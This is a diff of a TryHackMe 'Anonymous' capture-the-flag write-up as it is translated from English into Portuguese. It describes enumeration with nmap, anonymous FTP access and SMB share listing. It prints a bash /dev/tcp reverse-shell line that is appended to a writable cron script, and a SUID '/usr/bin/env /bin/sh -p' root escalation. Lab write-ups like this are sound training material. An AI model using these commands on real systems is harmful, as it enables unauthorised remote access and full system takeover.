@@ -13,61 +13,66 @@ alt: "tryhackme"
 </p>
 <hr>
 
-# Questions
+# Questões
 * Enumerate the machine.  How many ports are open?
 * What service is running on port 21?
 * What service is running on ports 139 and 445?
 * There's a share on the user's computer.  What's it called?
 <br>
 
-Ok, we have four questions before User and Root flags, let's start enumerating the machine to answer the first one.
+Temos quatro questões antes de pegar as flags de User e Root, então vamos começar enumerando a máquina para responder a primeira.
 
 [Anonymous room](https://tryhackme.com/room/anonymous)
 
 # Enumeration
-![nmap](/img/thm/anonymous/nmap.png)
 
-Let's start with standard nmap scan `nmap -sC -sV -oA nmap -v $IP`.
+Começando com o scan padrão do Nmap (que eu uso geralmente) `nmap -sC -sV -oA nmap -v $IP`.
 * sC - Default nmap scripts
 * sV - Open ports services/version
 * oA - Save output to 'nmap' file
 * v  - Verbose mode
 
-This is enough to answer the first tree questions. There's four open ports: 21 FTP, 22 SSH, 139 and 445 Samba.
+Isso já foi o suficiente para responder as três primeiras questões.
 
-To fourth question we'll need to run an another nmap script. As we can see, there are a Samba service running on machine, so we'll use a nse script to enumerate it. `nmap --script smb-enum-shares.nse -p 445,139 -v -oA smb $IP`
+![nmap](/img/thm/anonymous/nmap.png)
+
+
+Para a quarta questão precisaremos executar outro scan com o Nmap, e como podemos ver há um Samba sendo executado no sistema então precisaremos enumerá-lo. 
+`nmap --script smb-enum-shares.nse -p 445,139 -v -oA smb $IP`
 
 ![smb](/img/thm/anonymous/smbNmap.png)
 
-Nice, question answered, but why not access it? Using smbclient we can access this share and check it out. `smbclient \\\\$IP\\pics`
+Pronto, além da quarta questão respondida podemos acessar esse samba.
+`smbclient \\\\$IP\\pics`
 
 ![smbclient](/img/thm/anonymous/smbclient.png)
 
-Ok, nothing interesting here, so let's take a look at FTP server. It's allowing anonymous login.
+Nada de interessante aqui, porém o servidor FTP está acessível para login anônimo
 
 ![ftp](/img/thm/anonymous/ftpFiles.png)
 
-Here I found 3 files:
+E aqui temos 3 arquivos:
 * clean.sh
 * removed_files.log
 * to_do.txt
 
-With basics FTP commands can we download these files to check it out. Taking a look at log file can I presume that `clean.sh` files are constantly being executed. So let's read it.
+Olhando o arquivo de log, presumo que o script `clean.sh` está sendo executado a cada X minutos, então podemos ler o código fonte para ver o que está acontecendo.
 
 ![cleansh](/img/thm/anonymous/cleanSh.png)
 
-We have permissions to write inside this file, so let's do it with `append` command. First of all create a local file and put `bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1'` inside it.
+Tendo a permissão de escrita no arquivo podemos enviar uma linha de código que irá executar o bash, que nos enviará uma conexão 
+`bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1'`
 
 ![shell](/img/thm/anonymous/shell.png)
 
-Then we'll append it to remote file, it will execute this command and give us a reverse shell.
+Agora precisamos enviar a saída para dentro do arquivo `clean.sh` usando o `append`
 
 ![append](/img/thm/anonymous/append.png)
 
-Don't forget to run Netcat to wait connection.
+Usando o netcat preciso apenas esperar a conexão ser estabelecida.
 
 ![user](/img/thm/anonymous/user.png)
 
-Ok, it's PRIVESC TIME! To do it I used LinPEAS and reading the output I found something strange. Running a basic command can we get a root shell. So just typing `/usr/bin/env /bin/sh -p` we scalate our privileges.
+Flag de usuário encontrada, então vamos para a escalação de privilégios. Para fazer isso usei o linPEAS e na saída vi que posso preciso apenas executar um comando. `/usr/bin/env /bin/sh -p`
 
 ![root](/img/thm/anonymous/root.png)
